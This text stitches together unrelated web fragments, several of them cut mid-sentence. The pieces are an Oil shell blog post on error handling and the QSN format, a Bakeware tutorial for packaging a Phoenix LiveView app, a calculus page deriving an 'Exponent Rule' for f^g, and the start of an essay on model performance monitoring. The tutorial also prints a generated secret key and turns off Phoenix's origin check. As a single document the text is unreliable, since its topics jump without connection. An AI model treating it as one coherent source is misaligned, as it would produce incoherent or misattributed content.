correct.</p><p>Intrigued?

<p>
  2020-10-22
</p>

<p>On a <a href="https://lobste.rs/s/6bphbw/fennel_programming_language_rationale">lobste.rs thread</a> about the rationale for the Fennel language, I
posted this summary of why Oil exists:</p>
<blockquote>
<p>I think these features alone would justify a new shell:</p>
<ol>
<li>Getting rid of "quoting hell"</li>
<li>Getting rid of ad hoc parsing and splitting</li>
<li>Fixing errexit</li>
</ol>
<p>But Oil has a lot more than that, including unifying separate ad hoc
expression languages ...</p>
</blockquote>
<p>This post elaborates on these points.  I've condensed the rationale into four
critical features for the <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a>.</p>
<p>I give examples of each feature, link to docs (in progress), and comment on the
future of the project.</p>
 
<a name="the-osh-language"></a>
<h2>The OSH Language</h2>
<p>Recall that <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH</a> is designed to run existing shell scripts, and
has done that <a href="http://www.oilshell.org/blog/2018/01/15.html">since early 2018</a>.</p>
<p>It also fixes warts in the shell language with <strong>opt-in</strong> features.  These are
the four most important ones.</p>
<a name="reliable-error-handling"></a>
<h3>Reliable Error Handling</h3>
<p>I just finished an overhaul of shell's flaky <code>set -e</code> / <code>errexit</code> mechanism.
I'm excited by this, because I started it last year, but put it on the back
burner after being stumped!</p>
<p>I believe I've figured out every problem now, and would like your feedback.
The simple invariant is that <strong>OSH never loses an exit code</strong>, which is not
true of POSIX shell or <a href="http://www.oilshell.org/cross-ref.html?tag=bash#bash">bash</a>.  Here's a summary of the enhancements:</p>
<ul>
<li><code>strict_errexit</code> - A shell option to <strong>detect</strong> cases where you would lose
errors in shell, like <code>if myfunc</code>.  This improves your shell scripts, even if
you run them under another shell!  In other words, OSH can be used as a dev
tool.</li>
<li><code>inherit_errexit</code> - OSH implements this bash 4.4 option, which is a partial
fix for the "command sub errexit" problem.</li>
<li><code>command_sub_errexit</code> - A shell option to check for failure at the end of
every command sub, so you don't lose errors.
<ul>
<li>This fixes the problem shown in the last panel of a <a href="https://wizardzines.com/comics/bash-functions/">recent
comic by Julia Evans</a>:
<em>"bash is weird sometimes"</em></li>
</ul>
</li>
<li><code>process_sub_fail</code> - Like <code>pipefail</code>, but for process substitutions.  It
allows <code>errexit</code> to "see" the failure caused by process subs, like the <code>sort</code>
invocation in <code>cat foo.txt &lt;(sort /oops/error)</code>,
<ul>
<li><code>@_process_sub_status</code>: A variable that's analogous to <code>${PIPESTATUS[@]}</code>.
You may want to inspect the exit status of all processes.</li>
</ul>
</li>
<li>The <code>run</code> builtin turns <code>errexit</code> back on, so <code>if run myfunc</code> is safe.  It
also provides fine-grained control over exit codes.</li>
</ul>
<p>Yes, there are many solutions, because shell has many problems!  But you don't
have to remember all these names.  Add <code>shopt --set oil:basic</code> to the top of
your program to turn all options.  The <code>strict_errexit</code> failures will remind
you to use the <code>run</code> wrapper.</p>
<p>(Aside: I was able to fix all these problems cleanly in the interpreter.  I
spent time a lot of time on <a href="https://www.oilshell.org/blog/2016/11/29.html">Oil's architecture 4 years
ago</a> precisely so I could fix
such subtle problems.  When the code has a good structure, the "right place"
for a fix reveals itself to you.  Oil is still improving!)</p>
<a name="safe-processing-of-user-supplied-data-like-filenames"></a>
<h3>Safe Processing of User-Supplied Data (like filenames)</h3>
<p><a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> is the foundation for <a href="https://github.com/oilshell/oil/wiki/Structured-Data-in-Oil">Structured Data in
Oil</a>.  It removes
the need to invent ad hoc (and often broken) formats every time you need to
deal with user-supplied data in shell.  In other words, Oil scripts have an
alternative to messy parsing and splitting.</p>
<p>I just implemented a <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> decoder, after implementing an encoder earlier
this year.</p>
<p>Here are some short examples.  The <code>write</code> builtin prints its args to stdout,
and it accepts a <code>--qsn</code> flag:</p>
<pre><code># Print filenames ONE PER LINE.  If a name contains a
# newline or other special char, it's QSN-encoded like
# 'multi-line \n name with NUL \0 byte'

write --qsn -- *.txt
</code></pre>
<p>The <code>read</code> builtin provides the inverse:</p>
<pre><code>cat list.txt | while read --line --qsn {
  # _line is implictly set by 'read'
  rm -- $_line
}
</code></pre>
<p>I also implemented <code>read -0</code> as a synonym for bash's obscure <code>read -r -d ''</code>.
This allows you to consume <code>find -print0</code> output in shell, like <code>xargs -0</code>
does.  This format is distinct from QSN, but it's now easy to convert back and
forth between them.</p>
<p>This is the first cut of <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> support.  I expect it to evolve based on your
feedback!</p>
<ul>

in HTML</a> (2017).</li>
</ul>
<a name="eliminate-quoting-hell-the-qefs-problem"></a>
<h3>Eliminate Quoting Hell (the <code>!qefs</code> problem)</h3>
<p>This was done in summer 2019.  I described it in <a href="http://www.oilshell.org/release/latest/doc/simple-word-eval.html">Simple Word
Evaluation</a> earlier this year, and you can see examples in
<a href="http://www.oilshell.org/release/latest/doc/idioms.html">Oil Language Idioms</a>.</p>
<p>Briefly, Oil allows this:</p>
<pre><code>ls @myflags $filename
</code></pre>
<p>instead of</p>
<pre><code>ls "${myflags[@]}" "$filename"
</code></pre>
<p>Notice the <code>@</code> splice operator, and lack of quotes.</p>
<a name="static-parsing-enables-better-error-messages-and-tools"></a>
<h3>Static Parsing Enables Better Error Messages and Tools</h3>
<p>This blog began in 2016 with an explanation of <a href="http://www.oilshell.org/blog/2016/10/22.html">static
parsing</a>.  I didn't mention it in the comment quoted in
the intro, but it's still a crucial part of the project.</p>
<p>I was reminded how important this is when noticing that the authors of both
Perl 5 and the rc shell <a href="https://lobste.rs/s/7bpgbl/rc_plan_9_shell#c_mokqrn">made complaints about shell's dynamic
parsing</a>, going back 20-30
years!</p>
<p>This foundation is still paying dividends.  I recently used the static parser
to create detailed error messages for command subs:</p>
<pre><code><span>$</span> <span>shopt --set errexit command_sub_errexit</span>

<span>$</span> <span>d=$(date %x)</span>
date: invalid date ‘%x’
  d=$(date %x)
    ^~
[ interactive ]:13: fatal: Command sub exited with status 1 ...
</code></pre>
<p>and process subs:</p>
<pre><code><span>$</span> <span>shopt --set process_sub_fail</span>

<span>$</span> <span>cat /dev/null &lt;(sort oops)</span>
sort: cannot read: oops: No such file or directory
  cat /dev/null &lt;(sort oops)
                ^~
[ interactive ]:27: fatal: Exiting with status 2 ...
</code></pre>
<p>We point to the location of the failing construct.  No other shell does this!</p>
<p>In addition, Travis Everett has worked on a shell dependency bundler which
relies on static parsing.</p>
<ul>
<li>Related: The new <a href="http://www.oilshell.org/release/latest/doc/syntactic-concepts.html">Syntactic Concepts</a> doc lists static parsing as
one of 5 important concepts.</li>
</ul>
<a name="whats-next-for-the-project"></a>
<h2>What's Next For the Project?</h2>
<p>It was indeed useful to explicitly write out rationale for the language.  I've
done that many times with posts tagged #<a href="http://www.oilshell.org/blog/tags.html?tag=why-a-new-shell#why-a-new-shell">why-a-new-shell</a>, but
explaining it again helps, even after 4 years.  The project is evolving and
getting crisper.</p>
<a name="a-very-important-claim"></a>
<h3>A Very Important Claim</h3>
<p>With the overhaul of <code>errexit</code> and the <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> decoder, I believe we now have
all the bases for the <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a> covered!  These features
will be out with the next release.</p>
<p>The claim is that <strong>these four features alone justify a new Unix shell</strong>.  If
we finish the C++ translation, and end the project here, it would be
worthwhile.</p>
<p>To repeat, they are:</p>
<ol>
<li>Reliable error handling.  I can't recommend shell to my friends without
these fixes.</li>
<li>Safe processing of user-supplied data, i.e. an alternative to ad hoc parsing
and splitting.</li>
<li>Elimination of "quoting hell".  Let's fix it once and for all, rather than
admonishing every new shell programmer about it for the next 30 years, as
has been done for the past 30!</li>
<li>Static Parsing for better error messages and tools.  It also removes a
security issue.</li>
</ol>
<p>If you disagree, <a href="https://old.reddit.com/r/oilshell/comments/jg54gd/four_features_that_justify_a_new_unix_shell/?">let me know</a>!  I would like to hear what other
warts in the <strong>shell language</strong> need to be fixed or otherwise addressed.</p>
<p>(I'm leaving out the interactive shell here, as I believe the first priority is
a better shell for programming and automation.  A "cloud shell", if you will.)</p>
<a name="reviewing-the-biggest-cut-january-2020"></a>
<h3>Reviewing The Biggest Cut (January 2020)</h3>
<p>Back in January, I was already <strong>concerned about the scope</strong> of the project.  I
wrote that <a href="http://www.oilshell.org/blog/2020/01/ambitions.html#the-biggest-cut">the biggest cut</a> to the
project would be that Oil would be based on <strong>strings</strong>, rather than
Python-like data types.</p>
<p>Let me update that statement based on these crisp definitions:</p>
<ul>
<li>The <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a> is a compatible shell based on <strong>strings</strong>
(and arrays of strings).  Assignments look like <code>local x=mystr</code>.</li>
<li>The <a href="http://www.oilshell.org/cross-ref.html?tag=oil-language#oil-language">Oil language</a> has Python-like <strong>types and expressions</strong>.
Assignments look like <code>var x = 42 + a[i] + f(x, y)</code>.  It has a
garbage-collected heap of recursive data structures.</li>
</ul>
<p>So what I'm saying now is that the priority going forward is to
<strong>polish the OSH language</strong>, and put off the Oil language until the hazy
future.</p>
<p>That means finishing the translation to C++, hooking up the <a href="http://www.oilshell.org/blog/2020/08/risks.html#garbage-collection">garbage
collector</a>, and writing <a href="http://www.oilshell.org/release/latest/doc">documentation</a>.  It may mean preparing the code to
be embedded in another application, like the <a href="http://www.oilshell.org/cross-ref.html?tag=fish#fish">fish</a> shell.  (I've
<a href="https://github.com/oilshell/oil/wiki/Fish-Oil-Brainstorming">discussed this</a>
with the maintainer, and there's some interest.  But it's a lot of work, which
shouldn't be taken for granted, and there are unsolved problems.)</p>
<p>Achieving this OSH language milestone feels very doable, since everything
already works in Python, and something like <strong>915</strong> out of <strong>1685</strong> spec tests
pass in C++ (yielding a 30x - 50x speedup).</p>

<a name="oil-language-updates"></a>
<h3>Oil Language Updates</h3>
<p>But I'm not giving up on the Oil language!  I just need help. It exists in
prototype form, and your feedback will motivate me to work on it.</p>
<p>Here are some blog posts I want to write, to get the word out:</p>
<p><em>Four Features of the Oil Language</em>.  This post narrowed down OSH to four major
features, and Oil also has four:</p>
<ol>
<li>Python-like expressions, along with <a href="http://www.oilshell.org/release/latest/doc/eggex.html">eggexes</a></li>
<li>Ruby-like blocks, which enable DSLs and declarative configuration</li>
<li>procs (shell functions with signatures, <a href="http://www.oilshell.org/blog/tags.html?tag=shell-the-good-parts#shell-the-good-parts">which compose in unique
ways</a>)</li>
<li>Serialization formats like JSON and QTSV
(<a href="https://github.com/oilshell/oil/wiki/TSV2-Proposal">proposal</a>).  The
latter is a format for <a href="http://www.oilshell.org/blog/2018/11/30.html">typed tables</a>, built on top
of <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a>.</li>
</ol>
<p>We have working prototypes for every feature except QTSV.  You can <a href="http://oilshell.org/release/latest/">try them
now</a>!</p>
<p><em>Big Changes to the Oil Language</em>.  A list of recent changes I've made, which
should give potential contributors a feel for the language.</p>
<p><em>What Distinguishes Python, JS, and Ruby from Perl and PHP</em>.   The former
languages have a clean data model / memory model: a garbage collected heap with
reference semantics.</p>
<p>The latter languages have warts in their model.  Oil adds the clean model to
shell.</p>
<p><em>Comments on Comics</em>.  I can use these <a href="https://wizardzines.com/comics/bash-errors/">recent
comics</a> as a way to explain the
<a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a>.  (See other posts tagged #<a href="http://www.oilshell.org/blog/tags.html?tag=comic#comic">comic</a>.)</p>

<a name="summary"></a>
<h2>Summary</h2>
<p>I described 4 essential features of an improved shell language.  <a href="https://old.reddit.com/r/oilshell/comments/jg54gd/four_features_that_justify_a_new_unix_shell/?">Let me

<p><a rel="noreferrer noopener" href="https://github.com/spawnfest/bakeware/" target="_blank">Bakeware</a> is a new fantastic tool, built (by <a rel="noreferrer noopener" href="https://github.com/fhunleth" target="_blank">Frank Hunleth</a>, <a href="https://github.com/jjcarstens" target="_blank" rel="noreferrer noopener">Jon Carstens</a> and <a href="https://github.com/ConnorRigby" target="_blank" rel="noreferrer noopener">Connor Rigby</a>) over a weekend for the <a rel="noreferrer noopener" href="https://spawnfest.github.io/" target="_blank">SpawnFest 2020</a>, which compiles an Elixir, a Scenic or a Phoenix application into single executable binary (yes, like go-lang!). It can be extremely useful to distribute our apps, especially when they are command-line tools or Scenic applications.</p>



<p>For most of the Phoenix app deployments, this tool maybe is not crucial, but I think that sometime it can be really useful to have a Phoenix/Phoenix LiveView app (along with all the needed assets!) in a single, and easily sharable, binary.</p>



<p>Let’s see how to make it work with a Phoenix LiveView application. What we are going to see applies to CLIs and Scenic apps as well.</p>



<h2>Bakeware library and Counter LiveView example</h2>



<p>At the moment there isn’t an official library on <a href="http://hex.pm/" target="_blank" rel="noreferrer noopener">hex.pm</a>, so let’s start by downloading the Bakeware’s code from its <a href="https://github.com/spawnfest/bakeware/" target="_blank" rel="noreferrer noopener">GitHub repo, spawnfest/bakeware</a>.</p>



<div><pre><code>$ git clone https://github.com/spawnfest/bakeware.git
Cloning into 'bakeware'...
...
$ ls bakeware/bakeware
Makefile  README.md assets    lib       mix.exs   mix.lock  src       test
</code></pre>
</div>



<p>In the <em><a href="https://github.com/spawnfest/bakeware/tree/main/examples" target="_blank" rel="noreferrer noopener">bakeware/examples</a></em> folder, you can also find other useful examples. The library code we need is inside the <em>bakeware/bakeware </em>directory.</p>



<p>To see Bakeware<em> </em>in action, let’s create a new Phoenix project called <em>counter</em>, with <a href="https://hexdocs.pm/phoenix_live_view/Phoenix.LiveView.html" target="_blank" rel="noreferrer noopener">LiveView</a> support and without <a href="https://hexdocs.pm/ecto/Ecto.html" target="_blank" rel="noreferrer noopener">Ecto</a>.</p>



<div><pre><code>$ mix phx.new counter --live --no-ecto
...
$ cd counter
</code></pre>
</div>



<p>In the <code>counter</code> Phoenix project’s directory, we create a <code>lib/counter_web/live/counter_live.ex</code> file where we define a <code>CounterWeb.CounterLive</code> live view. You can can simply copy/paste the module’s code below.</p>



<div><pre><code>#lib/counter_web/live/counter_live.ex
defmodule CounterWeb.CounterLive do
  use CounterWeb, :live_view

  @impl true
  def mount(_params, _session, socket) do
    {:ok, assign(socket, counter: 0)}
  end

  @impl true
  def render(assigns) do
    ~L"""
    &lt;h1&gt;Counter: &lt;%= @counter %&gt;&lt;/h1&gt;
    &lt;button phx-click="dec"&gt;-&lt;/button&gt;
    &lt;button phx-click="inc"&gt;+&lt;/button&gt;
    """
  end

  @impl true
  def handle_event("inc", _, socket) do
    {:noreply, update(socket, :counter, &amp; &amp;1 + 1)}
  end

  @impl true
  def handle_event("dec", _, socket) do
    {:noreply, update(socket, :counter, &amp; &amp;1 - 1)}
  end

end
</code></pre>
</div>



<p>and update the <code>"/"</code> live route in <code>lib/counter_web/router.ex</code>.</p>



<div><pre><code>#lib/counter_web/router.ex
defmodule CounterWeb.Router do
  use CounterWeb, :router

  ...

  scope "/", CounterWeb do
    pipe_through :browser

    live "/", CounterLive, :index
  end
end
</code></pre>
</div>



<p>Ok, we now have a simple LiveView counter application that we can compile with Bakeware.</p>



<figure><img src="https://1o6jjh24p1t92lcqci49qg8a-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/phoenix_liveview_counter.gif" alt="Phoenix LiveView counter example" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Phoenix LiveView counter example</figcaption></figure>



<p>To use Bakeware we, just need to change the <code>mix.exs</code> file of our <code>counter</code> Phoenix project.</p>



<div><pre><code>#mix.exs
defmodule Counter.MixProject do
  def project do
    [
      app: :counter,
      ...
      releases: [
        baked_counter: [
          steps: [:assemble, &amp;Bakeware.assemble/1],
          strip_beams: Mix.env() == :prod,
          overwrite: true
        ]
      ]
    ]
  end

  defp aliases do
    [
      assets: ["cmd npm run deploy --prefix assets"],
      release: ["assets", "phx.digest", "release"],
      setup: ["deps.get", "cmd npm install --prefix assets"]
    ]
  end

  defp deps do
   [
    ...
    {:bakeware, path: "../bakeware/bakeware", runtime: false}
   ]
  end
end
</code></pre>
</div>



<p>We first add the <code>:bakeware</code> dependency, pointing the <code>:path</code> to the local <em>bakerware</em> subfolder and setting the <code>:runtime</code> option to <code>false</code>.</p>



<p>We then add the <code>:release</code> and <code>:assets</code> aliases, which shorten the list of command we need to type to build a release. For example, the <code>:release</code> alias runs <code>mix assets</code>, <code>mix phx.digest</code> and <code>mix release</code>.</p>



<p>Most importantly, we add a <code>:releases</code> option in the keyword list returned by <code>project/0</code>. The only release we build is called <code>baked_counter</code>, and we set  <code>[:assemble, &amp;Bakeware.assemble/1]</code> as a list of <code>:steps</code> to execute when assembling the release. We set two other options: <code>overwrite: true</code> (<em>if there is an existing release version, overwrite it</em>) and <code>:strip_beams</code> which is <code>true</code> only when the environment is <code>prod</code> (<em>controls if BEAM files should have their debug information, documentation chunks, and other non-essential metadata removed</em>).</p>



<p>Remember to add the <code>server: true</code> option to the <code>CounterWeb.Endpoint</code> production config, in <code>config/prod.exs</code></p>



<div><pre><code>#config/prod.exs

config :counter, CounterWeb.Endpoint,
  ...
  server: true,
  check_origin: false
</code></pre>
</div>



<p>When Setting <code>server: true</code> the web server is started when the endpoint supervision tree starts. We can also add <code>check_origin: false</code>, which disables the check of the origin header.</p>



<p>We are ready to build the release. Before running the <code>mix</code> tasks, we need to <code>SECRET_KEY_BASE</code> env variables.</p>



<div><pre><code>$ mix phx.gen.secret
y0RanKUeQ641fq8Mzh/sa0WwuVoBxwqVrgsXM+aGPrtpYRZwwuyoRRZpomw8ALqJ
$ export SECRET_KEY_BASE="y0RanKUeQ641fq8Mzh/sa0WwuVoBxwqVrgsXM+aGPrtpYRZwwuyoRRZpomw8ALqJ"
</code></pre>
</div>



<p>And then we run the <code>setup</code> and <code>release</code> mix tasks, setting the <code>MIX_ENV</code> env variable to <code>prod</code>.</p>



<div><pre><code>$ MIX_ENV=prod mix setup
...
$ MIX_ENV=prod mix release
...
* assembling bakeware baked_counter
Bakeware successfully assembled executable \
at _build/prod/rel/bakeware/baked_counter
</code></pre>
</div>



<p>The <code>baked_counter</code> executable binary is ready, we find it in the <code>_build/prod/rel/bakeware</code> folder.</p>

<p>When we run it we see that our server starts correctly, serving the web app assets (in this case just the javascript, css and Phoenix Framework logo).</p>



<div><pre><code>$ ./_build/prod/rel/bakeware/baked_counter

bakeware: starting '/Users/alvise/Documents/poeticoding/bakeware/code/counter/./_build/prod/rel/bakeware/baked_counter' (cachedir=/Users/alvise//Library/Caches/Bakeware)...

</code></pre>
</div>



<h2>How does Bakeware work?</h2>



<p>The executable binary, built by Bakeware, has the whole release compressed in it. When we run it, it extracts everything in a cache folder, and starts the application.</p>



<p>To optimize the start-time, Bakeware maintains a cache of extracted binaries and assets. In this way, the second time we run it, it’s faster since it doesn’t need to uncompress anything.</p>



<p>The cache directory location is system-specific:</p>



<ul><li>on macOS is <code>"~/Library/Caches/Bakeware"</code></li><li>on Linux and other Unixes is <code>"~/.cache/bakeware"</code></li><li>on Windows is <code>"C:/Users/&lt;USER&gt;/AppData/Local/Bakeware/cache"</code></li></ul>



<p>In this case, I’m on a mac. If we go in the <code>~/Library/Caches/Bakeware/6ea5f...</code> folder, we find the extracted release.</p>



<figure><img src="https://1o6jjh24p1t92lcqci49qg8a-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/extracted_release_in_cache_folder.png" alt="" srcset="https://1o6jjh24p1t92lcqci49qg8a-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/extracted_release_in_cache_folder.png 900w, https://1o6jjh24p1t92lcqci49qg8a-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/extracted_release_in_cache_folder-300x186.png 300w, https://1o6jjh24p1t92lcqci49qg8a-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/extracted_release_in_cache_folder-768x477.png 768w" sizes="(max-width: 900px) 100vw, 900px" data-lazy-srcset="https://1o6jjh24p1t92lcqci49qg8a-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/extracted_release_in_cache_folder.png 900w, https://1o6jjh24p1t92lcqci49qg8a-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/extracted_release_in_cache_folder-300x186.png 300w, https://1o6jjh24p1t92lcqci49qg8a-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/extracted_release_in_cache_folder-768x477.png 768w" data-lazy-src="https://1o6jjh24p1t92lcqci49qg8a-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/extracted_release_in_cache_folder.png?is-pending-load=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Extracted release in cache folder</figcaption></figure>



<p>And under <code>lib/counter-1.0/priv/static</code> we the app static assets.</p>



<h2>Share the app with another computer</h2>



<p>Let’s try the <code>baked_counter</code> on another mac. If you built your app on Linux, it should work on other similar Linux environments. Windows support is coming (take a look at the end of the article). </p>



<p>I’ve compiled it with my MacBook Pro with Catalina (10.15.7), so it would be nice to see if it works on a slightly older macOS version, like Mojave (10.14). I don’t have another Mac, so I use a remote macmini with macOS 10.14, hosted by MacinCloud, with a pay-as-you-go plan.</p>



<figure><img src="https://1o6jjh24p1t92lcqci49qg8a-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/on_another_computer.gif" alt="" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Running the app on another computer</figcaption></figure>



<p>And it works!! Is it compatible across many OS versions? Well… it depends by different things. When we build a release this is supposed to run on a target machine with the same operating system with a <em>similar</em> environment, like C runtime and other libraries referenced by the Erlang runtime and any NIFs and ports in the application.</p>



<h2>Wrap Up</h2>



<p>This is a project started just a month ago, and the team has planned to work on many other things, like for example:</p>



<ul><li>&lt;&lt;<a href="https://github.com/spawnfest/bakeware/issues/37" target="_blank" rel="noreferrer noopener">The Windows support seems to be not too far off!</a>&gt;&gt;</li><li>&lt;&lt;<a href="https://github.com/spawnfest/bakeware/issues/40" target="_blank" rel="noreferrer noopener">Cross-compilation is something to consider as a future feature</a>&gt;&gt;</li></ul>



<p>Do you think Bakeware is going to be helpful for you? Maybe for a CLI written in Elixir? Or a Scenic, or Phoenix app with LiveView? Let me know what you think!</p>

However, when we look at our <em>repertoire of functions</em>, we see that something else is missing, namely:</p><blockquote><p>What about the functions constructed via <strong>exponentiation</strong>?</p></blockquote><p>Here, prompted by an <em>unusual</em> sense of urgency, we proceed to toy around with the idea of <em>derivative of a power</em>, subsequently ending up developing a rule precisely for that purpose. The name? <strong>Exponent Rule</strong> of course! Now, we bet that you haven’t seen this one yet — at least not in a standard calculus textbook or <a href="https://www.khanacademy.org/math/differential-calculus?t=table-of-contents" target="_blank" rel="noopener noreferrer">Khan Academy</a> anyway!</p><h2 id="theory"><span id="Exponent_Rule_for_Derivative_%E2%80%94_Theory"></span><a href="#toc">Exponent Rule for Derivative — Theory</a><span></span></h2><p>Given a <strong>base function</strong>&nbsp;$f$ and an <strong>exponent function</strong> $g$ — both defined on an interval $I$ — one&nbsp;can construct&nbsp;the&nbsp;<strong>power function</strong>&nbsp;$f^g$ (i.e., $f$ raised to $g$),&nbsp;which is defined as long as&nbsp;$f(x)&gt;0$ on $I$ (<a href="https://mathvault.ca/logarithm-theory/#terms">why?</a>).

No&nbsp;worry. All we have shown is that the derivative of $f^g$ can be expressed in terms of the derivatives of $f$ and $g$&nbsp;— and hence the <strong>Exponent Rule</strong> for derivatives!</p><div><p>Theorem — The Exponent Rule for Derivative</p><div><p>Given a <strong>base</strong> function $f$ and an <strong>exponent</strong> function $g$, if:</p><ol><li>The <strong>power function</strong> $f^g$ is <em>well-defined</em> on an interval $I$ (i.e.,$f$ and $g$ both well-defined on $I$, with $f&gt;0$ on $I$)</li><li>Both $f$ and $g$ are <em>differentiable</em> on $I$</li></ol><p>then the function $f^g$ is <em>differentiable</em>&nbsp;on $I$ as well. In addition:</p><p>\begin{align*} (f^g)’ = f^g \left( g’ \ln f + f’ \frac{g}{f} \right) \qquad (x \in I) \end{align*}</p></div></div><p>In English, the <strong>Exponent Rule</strong> can be interpreted as follows:</p><blockquote><p>The derivative of a <strong>power</strong>, is equal to the power itself times the following: the derivative of the exponent times the logarithm of the base, plus the derivative of the base times the exponent-base ratio.</p></blockquote><p>And if that still sounds a bit pedantic, just know that the Exponent Rule basically guarantees that the derivative of $f^g$ — if exists — takes the form of $f^g (A+B)$, where:</p><ul><li>$A$ is obtained by taking the derivative of the <em>exponent</em>, times the logarithm of the <em>base</em>.</li><li>$B$ is obtained by taking the derivative of the <em>base</em> instead,&nbsp;times the ratio with the <em>exponent</em> on the top.</li></ul><p>In fact, with just a bit of practice, it’s possible to master the <strong>Exponent Rule</strong> as much as we&nbsp;do with&nbsp;the <em>Quotient Rule</em> — and this is not to mention&nbsp;the&nbsp;whole new world&nbsp;it opens up to our&nbsp;<em>mental calculus fanatics</em>!</p><h2 id="app"><span id="Exponent_Rule_for_Derivative_%E2%80%94_Applications"></span><a href="#toc">Exponent Rule for Derivative — Applications</a><span></span></h2><p>Traditionally, to evaluate the derivative of a <em>power function</em>, one would have to either resort&nbsp;to <a href="https://en.wikipedia.org/wiki/Logarithmic_differentiation" target="_blank" rel="noopener noreferrer"><strong>logarithmic differentiation</strong></a>, or <strong>base-e standardisation</strong>&nbsp;before differentiating it. With the advent of the Exponent Rule, both of these approaches basically become obsolete — not because they are irrelevant per se, but because they&nbsp;have&nbsp;already been carried out&nbsp;<em>during</em> the derivation of the Exponent Rule.</p><p>In what follows, we lay out&nbsp;7 examples illustrating how the Exponent Rule can be used to&nbsp;<em>streamline</em> the differentiation process for <strong>power functions</strong>, thereby freeing up some of our brainpower and resources&nbsp;to other potentially-more-challenging tasks that are yet to come.</p><h3 id="ex1"><span id="Example_1_%E2%80%94_$%5Cpi%5Ex$"></span><a href="#toc">Example 1 — $\pi^x$</a><span></span></h3><p>With the base function being $\pi$ and the exponent function $x$, the exponential function $\pi^x$ — which is defined on the <em>entire</em> real line&nbsp;— easily satisfies the <em>preconditions</em> laid out by the Exponent Rule. In which case, differentiating it using the Rule yields that:</p><p>\begin{align*} (\pi^x)’ &amp; = \pi^x \left[ (x)’ \ln \pi + (\pi)’ \frac{x}{\pi} \right] = \pi^x \ln \pi \qquad (x \in \mathbb{R})\end{align*}</p><p>which shows that $\pi^x$ differentiates to itself along&nbsp;with&nbsp;some&nbsp;<em>adjustment factor</em> — a typical behavior among the&nbsp;exponential functions.</p><p>Now, is that a&nbsp;<em>heavy-handed</em> differentiation approach to a&nbsp;particularly-simple function? Actually, not really, for as it turns out, the alternative approaches would have been essentially the same&nbsp;— save perhaps a few more extra <em>“patching” steps</em>.</p><p>Finally, to&nbsp;celebrate&nbsp;our first <em>successful</em> execution of the Exponent Rule, we’ve cooked up the graphs of $\pi^x$ and its derivative here:</p><figure id="attachment_6618" aria-describedby="caption-attachment-6618"><img loading="lazy" src="https://mathvault.ca/wp-content/uploads/pi^x.png" alt="The exponential function pi^x (red) and its derivative (green)" width="1020" height="716" title=""><figcaption id="caption-attachment-6618">$\pi^x$ in <span>red</span>, and its derivative in <span>green</span>.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div> <h4><strong>Data-driven software is the future. This shift is bringing about a new category of tools—what we call model performance monitoring (MPM).</strong></h4><p>&nbsp;<br>As we dig into the model performance monitoring market we’ve been asking ourselves: what can we learn from the evolution of application monitoring that might apply to data science? How is it different and what do we look for in this new set of tools?</p><p>Over the past two decades, there has been a wave of application performance monitoring (APM) companies that has fundamentally changed the course of software development; Datadog, New Relic, PagerDuty, AppDynamics, Dynatrace, and Splunk have created nearly $90B in market cap and growing. APM has enabled companies to prevent outages, monitor uptime, and ultimately has catalyzed digital transformation and the migration to cloud. These days it is difficult to imagine mission-critical software that relies on manual troubleshooting and spot-checking instead of systematic tooling. But such ad-hoc, unscalable workflows are shockingly commonplace in the world of machine learning systems.*</p><p>Much like cloud-native computing has ushered in a new era of software development and tooling, we believe data-driven systems, enabled by machine learning, have the power to unlock the next wave of innovation. In turn, we believe there will be a need for an analogous set of model performance monitoring (MPM) tools to help with data quality, drift, model performance, and system reliability. Companies like WhyLabs, Toro Data, Mona Labs, Monte Carlo Data, LightUp, Soda Data, among many others,&nbsp;are just beginning to capitalize on what we see as a multi-decade long trend.</p> </div></div><div><div> <h3><b>Why now?</b></h3><p>If we look at the history of APM, the first wave came about in the late 1990s, following the rapid adoption of Java. Even though the applications built with Java were fairly simple, software-first companies recognized a need to manage performance. Thus, early companies like Wily Technology were born.</p><p>The second generation of APM, catalyzed by the rise of the cloud and service-oriented architectures (SOA) in the 2000s, grew much larger. While new architectures offered the benefits of modularity, speed, and the development of more sophisticated software applications, they were also significantly more complex to manage. It took “moments of truth” – when these sophisticated, mission-critical systems failed – for companies to realize the importance of monitoring.</p><p>These tailwinds led to the creation of many of the widely-used APM solutions we know today—New Relic, Datadog, and many others.</p><p>In many ways, machine learning systems are the most complex systems we’ve seen to date, and these complex systems have become mission-critical to many companies. Uber depends on algorithms to automatically predict and price demand for rides. Netflix’s recommendation engine powers its core user experience. And the performance of the AI models in Tesla self-driving cars can save lives. The list goes on.</p><p>From Amazon to Facebook, we have learned about the sheer impact performance issues in machine learning systems can cause to a company. In the last 8 months alone, we’ve seen massive issues for business-critical models that have left companies scrambling to fix corrupted models. Instacart, for example, saw their inventory prediction models go haywire due to COVID-related consumer behavior changes. Accuracy declined from <a href="https://fortune.com/2020/06/09/instacart-coronavirus-artificial-intelligence/">93% to 